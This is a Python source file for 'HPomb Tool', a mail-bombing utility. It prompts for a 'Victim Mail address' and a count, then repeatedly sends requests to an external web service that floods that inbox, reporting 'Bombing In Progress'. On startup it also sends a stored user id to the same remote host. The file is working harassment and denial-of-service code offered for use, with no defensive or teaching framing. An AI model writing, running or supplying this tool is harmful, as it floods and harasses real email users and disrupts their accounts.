#!/usr/bin/env python
try:
    import os
    import sys
    import notify2
    import requests 
    import subprocess
except :
    print("Plase Install Require Package \nUsing 'pip install -r requirement.txt'")


Red = '\033[1;31m'
Blue= '\033[1;36m'
Endc = '\033[0m'
verl = open("core/.version", 'r').read()

typey = 00

try:
        import notify2
        typey = 1
except :
    typey = 0

if typey == 0 :
        def startM():
            pass
else:
    def startM():
        try:
            notify2.init('HPomb Tool')
            n = notify2.Notification("HPomb Tool",
                                    "Mail Bombing Start",
                                    ""
                                    )
            n.show()
            n.timeout = 50000
            print("\a")
        except:
            print("Sorry Notification Feature Not For You")



def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def banner():
    
    clr()
    logo="""
 ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗ ██████╗ ███████╗████████╗
██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔═══██╗██╔════╝╚══██╔══╝
██║     ██████╔╝███████║██║     █████╔╝ ███████╗██║   ██║█████╗     ██║   
██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ╚════██║██║   ██║██╔══╝     ██║   
╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████║╚██████╔╝██║        ██║   
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝        ╚═╝   
-by Shlok Kesarwani & Hacker-CrackSoft


               ""","""
----------------   ----------------------
| KLS  Project |   | Version : """,verl,""" |
----------------   ----------------------

"""
    print(Red+logo[0]+Blue+logo[1]+logo[2]+logo[3])


def mail():
    ve = open("core/.da", 'r')
    veq = ve.read()
    id = str(veq.strip())
    b = 0
    RG = str(input("Enter Victim Mail address : "))
    num = input("Enter Number of Mail : ")
    mail = int(num) + 1
    print("\n\t\tPlease Wait Bombing Start...")

    startM()
    for i in range(1,mail):
            url = "https://honeypots.tech//mail/index.php?mail="+str(RG)+"&num="+str(i)+"&id="+id
            header= {
                'Host': 'honeypots.tech',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0'
            }
            try:
                r = requests.get(url=url, headers= header , timeout=2)
            except:
                pass
            r_status = r.status_code
            if r_status == 200 :
                clr()
                banner()
                print(Blue)
                print("-------------------------------------------- ")
                print(Red +"                  Details "+Blue)
                print("   Target Gmail           : ",RG)
                print("   Number of Requests Sent : ", num)
                print("   Successful Requests     : ", i )
                print("   Failed Requests         : ", 0)
                print("-------------------------------------------- ")
                print("            Bombing In Progress")
            else :
                print(Blue+line,'\n')
                print('\n\tSomething Wrong to Send Mail ..\n\n       Please Contact To Developer ')
                print('\n\t     Error : 508\n')
                print(line)
                print(Red+'\n\t\t[ Sub Menu ]')
                print(Blue +'''\n[01] Contact To Developer\n[02] Again Run HPomb Tool''')
                error500 = input('\nChoose One Options : ')
                if error500 == 1:
                    subprocess.call([sys.executable, 'core/contact.py'])
                else: 
                    subprocess.call([sys.executable, 'hpomb.py'])        

clr()
banner()
try:
    ve = open("core/.da", 'r')
    veq = ve.read()
    id1 = str(veq.strip())
    r = requests.get('https://honeypots.tech/p/HPomb/user/what.php', params={'id':id1 , 'w':1 })
except:
        print('\n     Your Internet Connection Slow ... ')
        print('\n\t     Error : 510\n')
        print(line)
        input('\n\tPress Enter To Run Again HBomb Tool: ')
        subprocess.call([sys.executable, 'hbomb.py'])
mail()
